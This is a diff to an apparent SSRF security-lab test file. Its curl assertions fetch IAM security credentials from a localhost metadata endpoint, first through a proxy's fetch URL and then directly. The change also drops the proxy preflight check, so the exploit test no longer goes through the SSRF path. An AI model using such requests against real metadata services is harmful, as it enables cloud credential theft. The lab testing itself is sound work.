@@ -23,12 +23,6 @@ assertions:
   # PRE-FLIGHT: SSRF proxy works and metadata endpoint responds
   # ══════════════════════════════════════════════════════════════════════
 
-  - name: preflight-ssrf-proxy-responds
-    type: command
-    expect:
-      command: "curl -sf 'http://localhost:20900/fetch?url=http://localhost:80/health' | grep -q ok"
-      exit_code: 0
-
   - name: preflight-metadata-responds
     type: command
     expect:
@@ -56,10 +50,10 @@ assertions:
   # EXPLOIT: SSRF can reach metadata service
   # ══════════════════════════════════════════════════════════════════════
 
-  - name: exploit-ssrf-reaches-metadata
+  - name: exploit-ssrf-metadata-directly-reachable
     type: command
     expect:
-      command: "curl -sf 'http://localhost:20900/fetch?url=http://localhost:80/latest/meta-data/iam/security-credentials/test-ssrf-role' | grep -q AccessKeyId"
+      command: "curl -sf http://localhost:20900/latest/meta-data/iam/security-credentials/test-ssrf-role | grep -q AccessKeyId"
       exit_code: 0
 
   # ══════════════════════════════════════════════════════════════════════
